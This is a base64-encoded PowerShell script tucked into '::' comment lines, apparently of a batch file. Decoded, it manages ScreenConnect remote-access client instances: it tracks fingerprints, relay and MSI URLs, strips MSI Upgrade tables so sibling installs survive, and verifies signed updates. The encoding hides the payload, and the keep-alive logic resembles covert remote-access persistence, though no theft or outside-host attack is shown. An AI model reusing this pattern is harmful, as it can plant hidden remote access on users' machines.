::MHhvMGR1enBRZFBWakRuZUlJdE94Vk1ubDRNbVRTUzhpMTVPZk5USDZ5ZGRsZmk2
::dE5mVHZ2Q3RreGxMOWMwcVh4dElvWUxRTDlqQzI5NHQyTzB2T3NBbGloMGhTNlhB
::R3A4T0FUS1IvS1ZQcDhxZnc4dHpyU3ZLZ1lrcGU3OWJKNjdidGpPN3FUSHYxSnBQ
::MDR4ZVl0Q0tqU0ZONlhoMDJkcnRxdnl1Q0h2dzErMEhZZnZpYUg1eU5BcHdvTngv
::ZjVVNjN1TWlpckt1SmFaTUJ2WE04dW14eWtBR3JxZFNVMHBRPT08L01vZHVsdXM+
::PEV4cG9uZW50PkFRQUI8L0V4cG9uZW50PjwvUlNBS2V5VmFsdWU+DQonQA0KDQpm
::dW5jdGlvbiBHZXQtR3J5eGFDZmdQYXRoIHsgSm9pbi1QYXRoICRXb3JrRGlyICdn
::cnl4YS5jZmcnIH0NCmZ1bmN0aW9uIEdldC1TZXZyekNmZ1BhdGggeyBKb2luLVBh
::dGggJFdvcmtEaXIgJ3NldnJ6LmNmZycgfQ0KDQpmdW5jdGlvbiBHZXQtU2V2cnpL
::ZWVwIHsNCiAgICAkcHJpbSA9ICRzY3JpcHQ6U2V2cnpEZWZhdWx0UHJpbWFyeQ0K
::ICAgICRhbHQgPSAkc2NyaXB0OlNldnJ6RGVmYXVsdEFsdA0KICAgICRwID0gR2V0
::LVNldnJ6Q2ZnUGF0aA0KICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRw
::KSB7DQogICAgICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkcCAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAg
::ICAgICAgIGlmICgkXyAtbWF0Y2ggJ15QUklNQVJZX0ZQPShbMC05YS1mQS1GXXsx
::Nn0pXHMqJCcpIHsgJHByaW0gPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQ0KICAg
::ICAgICAgICAgaWYgKCRfIC1tYXRjaCAnXkFMVF9GUD0oWzAtOWEtZkEtRl17MTZ9
::KVxzKiQnKSB7ICRhbHQgPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQ0KICAgICAg
::ICAgICAgaWYgKCRfIC1tYXRjaCAnXkVYUEVDVEVEX1BSSU1BUlk9KFswLTlhLWZB
::LUZdezE2fSlccyokJykgeyAkcHJpbSA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9
::DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdeRVhQRUNURURfQUxUPShbMC05
::YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGFsdCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIo
::KSB9DQogICAgICAgIH0NCiAgICB9DQogICAgJHNjcmlwdDpTZXZyektlZXAgPSBA
::KCRwcmltLCAkYWx0KQ0KICAgIHJldHVybiBAKCRwcmltLCAkYWx0KQ0KfQ0KDQpm
::dW5jdGlvbiBTZXQtU2V2cnpGcChbc3RyaW5nXSRQcmltYXJ5LCBbc3RyaW5nXSRB
::bHQpIHsNCiAgICBpZiAoLW5vdCAkUHJpbWFyeSkgeyAkUHJpbWFyeSA9ICRzY3Jp
::cHQ6U2V2cnpEZWZhdWx0UHJpbWFyeSB9DQogICAgaWYgKC1ub3QgJEFsdCkgeyAk
::QWx0ID0gJHNjcmlwdDpTZXZyekRlZmF1bHRBbHQgfQ0KICAgIGlmICgtbm90IChU
::ZXN0LVBhdGggLUxpdGVyYWxQYXRoICRXb3JrRGlyKSkgeyBOZXctSXRlbSAtSXRl
::bVR5cGUgRGlyZWN0b3J5IC1QYXRoICRXb3JrRGlyIC1Gb3JjZSB8IE91dC1OdWxs
::IH0NCiAgICBAKA0KICAgICAgICAiUFJJTUFSWV9GUD0kKCRQcmltYXJ5LlRvTG93
::ZXIoKSkiLA0KICAgICAgICAiQUxUX0ZQPSQoJEFsdC5Ub0xvd2VyKCkpIiwNCiAg
::ICAgICAgIkVYUEVDVEVEX1BSSU1BUlk9JCgkUHJpbWFyeS5Ub0xvd2VyKCkpIiwN
::CiAgICAgICAgIkVYUEVDVEVEX0FMVD0kKCRBbHQuVG9Mb3dlcigpKSIsDQogICAg
::ICAgICJVUERBVEVEPSQoKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0
::cmluZygnbycpKSINCiAgICApIHwgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChH
::ZXQtU2V2cnpDZmdQYXRoKSAtRW5jb2RpbmcgQVNDSUkgLUZvcmNlDQogICAgJHNj
::cmlwdDpTZXZyektlZXAgPSBAKCRQcmltYXJ5LlRvTG93ZXIoKSwgJEFsdC5Ub0xv
::d2VyKCkpDQp9DQoNCmZ1bmN0aW9uIFN5bmMtU2V2cnpFeHBlY3RlZChbc3RyaW5n
::XSRFeHBlY3RlZFRleHQpIHsNCiAgICAjIEFwcGx5IHJlcG8gc2V2cnpfZXhwZWN0
::ZWQuY2ZnIGJvZHkgKEVYUEVDVEVEX1BSSU1BUlk9L0VYUEVDVEVEX0FMVD0gbGlu
::ZXMpDQogICAgJHByaW0gPSAkbnVsbDsgJGFsdCA9ICRudWxsDQogICAgZm9yZWFj
::aCAoJGxpbmUgaW4gKCRFeHBlY3RlZFRleHQgLXNwbGl0ICJgcj9gbiIpKSB7DQog
::ICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15FWFBFQ1RFRF9QUklNQVJZPShbMC05
::YS1mQS1GXXsxNn0pXHMqJCcpIHsgJHByaW0gPSAkbWF0Y2hlc1sxXS5Ub0xvd2Vy
::KCkgfQ0KICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICdeRVhQRUNURURfQUxUPShb
::MC05YS1mQS1GXXsxNn0pXHMqJCcpIHsgJGFsdCA9ICRtYXRjaGVzWzFdLlRvTG93
::ZXIoKSB9DQogICAgfQ0KICAgIGlmICgtbm90ICRwcmltKSB7ICRwcmltID0gKEdl
::dC1TZXZyektlZXApWzBdIH0NCiAgICBpZiAoLW5vdCAkYWx0KSB7ICRhbHQgPSAo
::R2V0LVNldnJ6S2VlcClbMV0gfQ0KICAgIFNldC1TZXZyekZwICRwcmltICRhbHQN
::CiAgICByZXR1cm4gIlNFVlJafCRwcmltfCRhbHQiDQp9DQoNCmZ1bmN0aW9uIFBy
::b3RlY3QtTXNpU2libGluZ1NhZmUoW3N0cmluZ10kTXNpUGF0aCkgew0KICAgICMg
::TDQwL0w0NDogY29weSBNU0kgYW5kIERFTEVURSBGUk9NIFVwZ3JhZGUgc28gL2kg
::Y2Fubm90IFJlbW92ZUV4aXN0aW5nUHJvZHVjdHMgc2libGluZ3MuDQogICAgIyBM
::NDQ6IHZlcmlmeSBVcGdyYWRlIGlzIGVtcHR5IGFmdGVyIERFTEVURSDigJQgbmV2
::ZXIgcmV0dXJuIGEgc3RpbGwtZGFuZ2Vyb3VzIE1TSS4NCiAgICBpZiAoLW5vdCAk
::TXNpUGF0aCAtb3IgLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkTXNpUGF0
::aCkpIHsgcmV0dXJuICRudWxsIH0NCiAgICAkc2FmZSA9IEpvaW4tUGF0aCAkZW52
::OlRFTVAgKCJzY19zYWZlX3swfS5tc2kiIC1mIFtndWlkXTo6TmV3R3VpZCgpLlRv
::U3RyaW5nKCdOJykpDQogICAgdHJ5IHsNCiAgICAgICAgQ29weS1JdGVtIC1MaXRl
::cmFsUGF0aCAkTXNpUGF0aCAtRGVzdGluYXRpb24gJHNhZmUgLUZvcmNlDQogICAg
::ICAgICRpID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdpbmRvd3NJbnN0YWxsZXIu
::SW5zdGFsbGVyDQogICAgICAgICRkYiA9ICRpLk9wZW5EYXRhYmFzZSgoUmVzb2x2
::ZS1QYXRoIC1MaXRlcmFsUGF0aCAkc2FmZSkuUGF0aCwgMSkNCiAgICAgICAgdHJ5
::IHsNCiAgICAgICAgICAgICR2ID0gJGRiLk9wZW5WaWV3KCdERUxFVEUgRlJPTSBg
::VXBncmFkZWAnKQ0KICAgICAgICAgICAgJHYuRXhlY3V0ZSgpIHwgT3V0LU51bGwN
::CiAgICAgICAgICAgICRkYi5Db21taXQoKQ0KICAgICAgICB9IGNhdGNoIHsNCiAg
::ICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkc2FmZSAtRm9yY2Ug
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgIHJldHVy
::biAkbnVsbA0KICAgICAgICB9DQogICAgICAgICMgdmVyaWZ5IGVtcHR5DQogICAg
::ICAgIHRyeSB7DQogICAgICAgICAgICAkZGIyID0gJGkuT3BlbkRhdGFiYXNlKChS
::ZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRoICRzYWZlKS5QYXRoLCAwKQ0KICAgICAg
::ICAgICAgJGMgPSAkZGIyLk9wZW5WaWV3KCdTRUxFQ1QgYFVwZ3JhZGVDb2RlYCBG
::Uk9NIGBVcGdyYWRlYCcpDQogICAgICAgICAgICAkYy5FeGVjdXRlKCkgfCBPdXQt
::TnVsbA0KICAgICAgICAgICAgaWYgKCRjLkZldGNoKCkpIHsNCiAgICAgICAgICAg
::ICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHNhZmUgLUZvcmNlIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAgICAgcmV0dXJu
::ICRudWxsDQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAg
::ICAgICAgIyBtaXNzaW5nIFVwZ3JhZGUgdGFibGUgPSBhbHJlYWR5IHNhZmUNCiAg
::ICAgICAgfQ0KICAgICAgICByZXR1cm4gJHNhZmUNCiAgICB9IGNhdGNoIHsNCiAg
::ICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHNhZmUpIHsgUmVtb3Zl
::LUl0ZW0gLUxpdGVyYWxQYXRoICRzYWZlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZSB9DQogICAgICAgIHJldHVybiAkbnVsbA0KICAgIH0NCn0N
::Cg0KZnVuY3Rpb24gVGVzdC1VcGRhdGVNYW5pZmVzdChbc3RyaW5nXSRNYW5pZmVz
::dFBhdGgsIFtzdHJpbmddJFNpZ1BhdGgsIFtoYXNodGFibGVdJEZpbGVNYXApIHsN
::CiAgICAjIFZlcmlmeSBSU0EtU0hBMjU2IHNpZ25hdHVyZSBvdmVyIHVwZGF0ZS5t
::YW5pZmVzdCwgdGhlbiBTSEEyNTYgb2YgZWFjaCBzdGFnZWQgZmlsZS4NCiAgICBp
::ZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkTWFuaWZlc3RQYXRoKSAt
::b3IgLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkU2lnUGF0aCkpIHsgcmV0
::dXJuICdtaXNzaW5nJyB9DQogICAgaWYgKC1ub3QgJHNjcmlwdDpVcGRhdGVQdWJL
::ZXlYbWwgLW9yICRzY3JpcHQ6VXBkYXRlUHViS2V5WG1sIC1tYXRjaCAnUExBQ0VI
::T0xERVInKSB7IHJldHVybiAnbm8tcHVia2V5JyB9DQogICAgdHJ5IHsNCiAgICAg
::ICAgJGJ5dGVzID0gW0lPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoKFJlc29sdmUtUGF0
::aCAtTGl0ZXJhbFBhdGggJE1hbmlmZXN0UGF0aCkuUGF0aCkNCiAgICAgICAgJHNp
::ZyA9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygoW0lPLkZpbGVdOjpSZWFk
::QWxsVGV4dCgoUmVzb2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkU2lnUGF0aCkuUGF0
::aCkuVHJpbSgpKSkNCiAgICAgICAgJHJzYSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5
::cHRvZ3JhcGh5LlJTQV06OkNyZWF0ZSgpDQogICAgICAgICRyc2EuRnJvbVhtbFN0
::cmluZygkc2NyaXB0OlVwZGF0ZVB1YktleVhtbCkNCiAgICAgICAgaWYgKC1ub3Qg
::JHJzYS5WZXJpZnlEYXRhKCRieXRlcywgJHNpZywgW1N5c3RlbS5TZWN1cml0eS5D
::cnlwdG9ncmFwaHkuSGFzaEFsZ29yaXRobU5hbWVdOjpTSEEyNTYsIFtTeXN0ZW0u
::U2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJTQVNpZ25hdHVyZVBhZGRpbmddOjpQa2Nz
::MSkpIHsNCiAgICAgICAgICAgIHJldHVybiAnYmFkLXNpZycNCiAgICAgICAgfQ0K
::ICAgICAgICAkZG9jID0gR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRNYW5pZmVz
::dFBhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgZm9yZWFjaCAo
::JG5hbWUgaW4gJEZpbGVNYXAuS2V5cykgew0KICAgICAgICAgICAgJHBhdGggPSAk
::RmlsZU1hcFskbmFtZV0NCiAgICAgICAgICAgIGlmICgtbm90IChUZXN0LVBhdGgg
::LUxpdGVyYWxQYXRoICRwYXRoKSkgeyByZXR1cm4gIm1pc3NpbmctZmlsZTokbmFt
::ZSIgfQ0KICAgICAgICAgICAgJHdhbnQgPSBbc3RyaW5nXSRkb2MuZmlsZXMuJG5h
::bWUNCiAgICAgICAgICAgIGlmICgtbm90ICR3YW50KSB7IHJldHVybiAibm90LWlu
::LW1hbmlmZXN0OiRuYW1lIiB9DQogICAgICAgICAgICAkc2hhID0gW1N5c3RlbS5T
::ZWN1cml0eS5DcnlwdG9ncmFwaHkuU0hBMjU2XTo6Q3JlYXRlKCkNCiAgICAgICAg
::ICAgICRmcyA9IFtJTy5GaWxlXTo6T3BlblJlYWQoKFJlc29sdmUtUGF0aCAtTGl0
::ZXJhbFBhdGggJHBhdGgpLlBhdGgpDQogICAgICAgICAgICB0cnkgeyAkaGFzaCA9
::IChbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHNoYS5Db21wdXRlSGFzaCgkZnMp
::KSkuUmVwbGFjZSgnLScsICcnKS5Ub0xvd2VyKCkgfQ0KICAgICAgICAgICAgZmlu
::YWxseSB7ICRmcy5DbG9zZSgpIH0NCiAgICAgICAgICAgIGlmICgkaGFzaCAtbmUg
::JHdhbnQuVG9Mb3dlcigpKSB7IHJldHVybiAiaGFzaC1taXNtYXRjaDokbmFtZSIg
::fQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAnb2snDQogICAgfSBjYXRjaCB7
::IHJldHVybiAiZXJyb3I6JCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiIH0NCn0NCg0K
::ZnVuY3Rpb24gR2V0LUdyeXhhRnAgew0KICAgICRmcCA9ICRzY3JpcHQ6R3J5eGFE
::ZWZhdWx0RnANCiAgICAkcCA9IEdldC1Hcnl4YUNmZ1BhdGgNCiAgICBpZiAoVGVz
::dC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkgew0KICAgICAgICBHZXQtQ29udGVudCAt
::TGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBG
::b3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdeQ1VS
::UkVOVF9GUD0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7ICRmcCA9ICRtYXRjaGVz
::WzFdLlRvTG93ZXIoKSB9DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuICRm
::cA0KfQ0KDQpmdW5jdGlvbiBTZXQtR3J5eGFGcChbc3RyaW5nXSRGaW5nZXJwcmlu
::dCkgew0KICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gfQ0KICAg
::IGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRXb3JrRGlyKSkgeyBO
::ZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRXb3JrRGlyIC1Gb3Jj
::ZSB8IE91dC1OdWxsIH0NCiAgICBAKA0KICAgICAgICAiQ1VSUkVOVF9GUD0kKCRG
::aW5nZXJwcmludC5Ub0xvd2VyKCkpIiwNCiAgICAgICAgIlJFTEFZPSQoJHNjcmlw
::dDpHcnl4YVJlbGF5SG9zdCkiLA0KICAgICAgICAiVUk9JCgkc2NyaXB0OkdyeXhh
::VWlIb3N0KSIsDQogICAgICAgICJNU0lVUkw9JCgkc2NyaXB0OkdyeXhhTXNpVXJs
::KSIsDQogICAgICAgICJVUERBVEVEPSQoKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRp
::bWUoKS5Ub1N0cmluZygnbycpKSINCiAgICApIHwgU2V0LUNvbnRlbnQgLUxpdGVy
::YWxQYXRoIChHZXQtR3J5eGFDZmdQYXRoKSAtRW5jb2RpbmcgQVNDSUkgLUZvcmNl
::DQp9DQoNCiMgTDM5OiBuZXZlciBhZG9wdCBhIGZvcmVpZ24gU0MgYXMgR3J5eGEu
::IEtlZXBlciBvbmx5IGlmIEZQIGlzIEV4cGVjdGVkRnAgT1INCiMgSW1hZ2VQYXRo
::L2NtZGxpbmUgY29udGFpbnMgZ3J5eGEuY29tIChvciBjZmcgUkVMQVkgaG9zdCku
::IERvIE5PVCB0cnVzdCBjZmcgYWxvbmUg4oCUDQojIGEgcG9pc29uZWQgQ1VSUkVO
::VF9GUCB3b3VsZCBzZWxmLXdoaXRlbGlzdCBmb3JldmVyLg0KZnVuY3Rpb24gVGVz
::dC1Jc0dyeXhhRnAoW3N0cmluZ10kRnApIHsNCiAgICBpZiAoLW5vdCAkRnApIHsg
::cmV0dXJuICRmYWxzZSB9DQogICAgJGZwID0gJEZwLlRvTG93ZXIoKQ0KICAgIGlm
::ICgkZnAgLWluICRzY3JpcHQ6U2V2cnpLZWVwKSB7IHJldHVybiAkZmFsc2UgfQ0K
::ICAgIGlmICgkc2NyaXB0OkdyeXhhRXhwZWN0ZWRGcCAtYW5kICRmcCAtZXEgJHNj
::cmlwdDpHcnl4YUV4cGVjdGVkRnAuVG9Mb3dlcigpKSB7IHJldHVybiAkdHJ1ZSB9
::DQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRmcCkiDQogICAg
::JGltZyA9IFtzdHJpbmddKEdldC1JdGVtUHJvcGVydHkgIkhLTE06XFNZU1RFTVxD
::dXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1wkbmFtZSIgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUpLkltYWdlUGF0aA0KICAgICRyZWxheSA9ICRzY3JpcHQ6
::R3J5eGFSZWxheUhvc3QNCiAgICBpZiAoJGltZyAtYW5kICgkaW1nIC1tYXRjaCAn
::KD9pKWdyeXhhXC5jb20nIC1vciAoJHJlbGF5IC1hbmQgJGltZyAtbGlrZSAiKiRy
::ZWxheSoiKSkpIHsgcmV0dXJuICR0cnVlIH0NCiAgICBmb3JlYWNoICgkcHJvYyBp
::biAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAiTmFtZSBs
::aWtlICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlKSkgew0KICAgICAgICAkYmxvYiA9ICIkKFtzdHJpbmddJHByb2MuRXhlY3V0
::YWJsZVBhdGgpICQoW3N0cmluZ10kcHJvYy5Db21tYW5kTGluZSkiDQogICAgICAg
::IGlmICgkYmxvYiAtbGlrZSAiKiRmcCoiIC1hbmQgKCRibG9iIC1tYXRjaCAnKD9p
::KWdyeXhhXC5jb20nIC1vciAoJHJlbGF5IC1hbmQgJGJsb2IgLWxpa2UgIiokcmVs
::YXkqIikpKSB7DQogICAgICAgICAgICByZXR1cm4gJHRydWUNCiAgICAgICAgfQ0K
::ICAgIH0NCiAgICByZXR1cm4gJGZhbHNlDQp9DQoNCmZ1bmN0aW9uIEdldC1LZWVw
::RmluZ2VycHJpbnRzIHsNCiAgICAkc2V0ID0gTmV3LU9iamVjdCAnU3lzdGVtLkNv
::bGxlY3Rpb25zLkdlbmVyaWMuSGFzaFNldFtzdHJpbmddJyAoW1N0cmluZ0NvbXBh
::cmVyXTo6T3JkaW5hbElnbm9yZUNhc2UpDQogICAgZm9yZWFjaCAoJHMgaW4gKEdl
::dC1TZXZyektlZXApKSB7IFt2b2lkXSRzZXQuQWRkKCRzKSB9DQogICAgaWYgKCRz
::Y3JpcHQ6R3J5eGFFeHBlY3RlZEZwKSB7IFt2b2lkXSRzZXQuQWRkKCRzY3JpcHQ6
::R3J5eGFFeHBlY3RlZEZwKSB9DQogICAgJGNmZyA9IEdldC1Hcnl4YUZwDQogICAg
::aWYgKCRjZmcgLWFuZCAoVGVzdC1Jc0dyeXhhRnAgJGNmZykpIHsgW3ZvaWRdJHNl
::dC5BZGQoJGNmZykgfQ0KICAgIGVsc2VpZiAoJHNjcmlwdDpHcnl4YUV4cGVjdGVk
::RnApIHsgW3ZvaWRdJHNldC5BZGQoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIH0N
::CiAgICBlbHNlIHsgW3ZvaWRdJHNldC5BZGQoJHNjcmlwdDpHcnl4YURlZmF1bHRG
::cCkgfQ0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdT
::Y3JlZW5Db25uZWN0IENsaWVudConIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlKSkgew0KICAgICAgICBpZiAoJHN2Yy5TdGF0dXMgLW5vdGluIEAoJ1J1bm5p
::bmcnLCdTdGFydFBlbmRpbmcnLCdDb250aW51ZVBlbmRpbmcnKSkgeyBjb250aW51
::ZSB9DQogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsx
::Nn0pXCknKSB7DQogICAgICAgICAgICAkZnAgPSAkbWF0Y2hlc1sxXS5Ub0xvd2Vy
::KCkNCiAgICAgICAgICAgIGlmICgkZnAgLWluICRzY3JpcHQ6U2V2cnpLZWVwKSB7
::IGNvbnRpbnVlIH0NCiAgICAgICAgICAgIGlmIChUZXN0LUlzR3J5eGFGcCAkZnAp
::IHsgW3ZvaWRdJHNldC5BZGQoJGZwKTsgU2V0LUdyeXhhRnAgJGZwIH0NCiAgICAg
::ICAgfQ0KICAgIH0NCiAgICByZXR1cm4gQCgkc2V0KQ0KfQ0KDQpmdW5jdGlvbiBU
::ZXN0LVRjcEhvc3RQb3J0KFtzdHJpbmddJEhvc3ROYW1lLCBbaW50XSRQb3J0ID0g
::NDQzLCBbaW50XSRUaW1lb3V0TXMgPSA4MDAwKSB7DQogICAgaWYgKC1ub3QgJEhv
::c3ROYW1lKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgICRjID0gJG51bGwNCiAgICB0
::cnkgew0KICAgICAgICAkYyA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRz
::LlRjcENsaWVudA0KICAgICAgICAkaWFyID0gJGMuQmVnaW5Db25uZWN0KCRIb3N0
::TmFtZSwgJFBvcnQsICRudWxsLCAkbnVsbCkNCiAgICAgICAgaWYgKC1ub3QgJGlh
::ci5Bc3luY1dhaXRIYW5kbGUuV2FpdE9uZSgkVGltZW91dE1zLCAkZmFsc2UpKSB7
::IHRyeSB7ICRjLkNsb3NlKCkgfSBjYXRjaCB7fTsgcmV0dXJuICRmYWxzZSB9DQog
::ICAgICAgICRjLkVuZENvbm5lY3QoJGlhcik7IHJldHVybiAkdHJ1ZQ0KICAgIH0g
::Y2F0Y2ggeyByZXR1cm4gJGZhbHNlIH0gZmluYWxseSB7IGlmICgkYykgeyB0cnkg
::eyAkYy5DbG9zZSgpIH0gY2F0Y2gge30gfSB9DQp9DQoNCmZ1bmN0aW9uIEdldC1N
::c2lQcm9wZXJ0eShbc3RyaW5nXSRNc2lQYXRoLCBbc3RyaW5nXSRQcm9wZXJ0eU5h
::bWUpIHsNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkTXNp
::UGF0aCkpIHsgcmV0dXJuICRudWxsIH0NCiAgICB0cnkgew0KICAgICAgICAkaSA9
::IE5ldy1PYmplY3QgLUNvbU9iamVjdCBXaW5kb3dzSW5zdGFsbGVyLkluc3RhbGxl
::cg0KICAgICAgICAkZGIgPSAkaS5PcGVuRGF0YWJhc2UoKFJlc29sdmUtUGF0aCAt
::TGl0ZXJhbFBhdGggJE1zaVBhdGgpLlBhdGgsIDApDQogICAgICAgICR2ID0gJGRi
::Lk9wZW5WaWV3KCJTRUxFQ1QgYFZhbHVlYCBGUk9NIGBQcm9wZXJ0eWAgV0hFUkUg
::YFByb3BlcnR5YD0nJFByb3BlcnR5TmFtZSciKQ0KICAgICAgICAkdi5FeGVjdXRl
::KCkgfCBPdXQtTnVsbA0KICAgICAgICAkciA9ICR2LkZldGNoKCkNCiAgICAgICAg
::aWYgKC1ub3QgJHIpIHsgcmV0dXJuICRudWxsIH0NCiAgICAgICAgcmV0dXJuIFtz
::dHJpbmddJHIuU3RyaW5nRGF0YSgxKQ0KICAgIH0gY2F0Y2ggeyByZXR1cm4gJG51
::bGwgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtRnBGcm9tUHJvZHVjdE5hbWUoW3N0cmlu
::Z10kUHJvZHVjdE5hbWUpIHsNCiAgICBpZiAoJFByb2R1Y3ROYW1lIC1tYXRjaCAn
::XCgoWzAtOWEtZkEtRl17MTZ9KVwpJykgeyByZXR1cm4gJG1hdGNoZXNbMV0uVG9M
::b3dlcigpIH0NCiAgICByZXR1cm4gJG51bGwNCn0NCg0KZnVuY3Rpb24gRmluZC1Q
::cm9kdWN0R3VpZChbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgICRuYW1lID0g
::IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0KICAgIGZvcmVh
::Y2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsNCiAgICAgICAg
::aWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQ0KICAgICAg
::ICBmb3JlYWNoICgka2V5IGluIChHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICAgICAgJGRuID0gKEdl
::dC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUpLkRpc3BsYXlOYW1lDQogICAgICAgICAgICBpZiAoJGRuIC1hbmQg
::KCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtlICd7
::Kn0nKSkgeyByZXR1cm4gJGtleS5QU0NoaWxkTmFtZSB9DQogICAgICAgIH0NCiAg
::ICB9DQogICAgcmV0dXJuICRudWxsDQp9DQoNCmZ1bmN0aW9uIFRlc3QtU2NSdW5u
::aW5nKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAgIyBMNDc6IHVzZSBzYy5l
::eGUgKEdldC1TZXJ2aWNlIHNvbWV0aW1lcyBtaXNzZXMgU1RPUFBFRC9wZW5kaW5n
::IFNDIG5hbWVzIOKGkiBmYWxzZSBBQlNFTlQg4oaSIGJhZCBoZWFsKS4NCiAgICBp
::ZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgJG91
::dCA9ICYgc2MuZXhlIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdl
::cnByaW50KSIgMj4mMSB8IE91dC1TdHJpbmcNCiAgICByZXR1cm4gW2Jvb2xdKCRv
::dXQgLW1hdGNoICcoP2kpU1RBVEVccyo6XHMqXGQrXHMrKFJVTk5JTkd8U1RBUlRf
::UEVORElOR3xDT05USU5VRV9QRU5ESU5HKScpDQp9DQoNCmZ1bmN0aW9uIFRlc3Qt
::U2NTZXJ2aWNlRXhpc3RzKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAgaWYg
::KC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAkZmFsc2UgfQ0KICAgICYgc2Mu
::ZXhlIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIg
::Mj4mMSB8IE91dC1OdWxsDQogICAgcmV0dXJuICgkTEFTVEVYSVRDT0RFIC1lcSAw
::KQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LVNjRGlyKFtzdHJpbmddJEZpbmdlcnByaW50
::KSB7DQogICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgke2VudjpQcm9ncmFtRmlsZXMo
::eDg2KX0sICRlbnY6UHJvZ3JhbUZpbGVzKSkgew0KICAgICAgICBpZiAoVGVzdC1Q
::YXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRiYXNlICJTY3JlZW5Db25uZWN0
::IENsaWVudCAoJEZpbmdlcnByaW50KSIpKSB7IHJldHVybiAkdHJ1ZSB9DQogICAg
::fQ0KICAgIHJldHVybiAkZmFsc2UNCn0NCg0KZnVuY3Rpb24gRmluZC1SdW5uaW5n
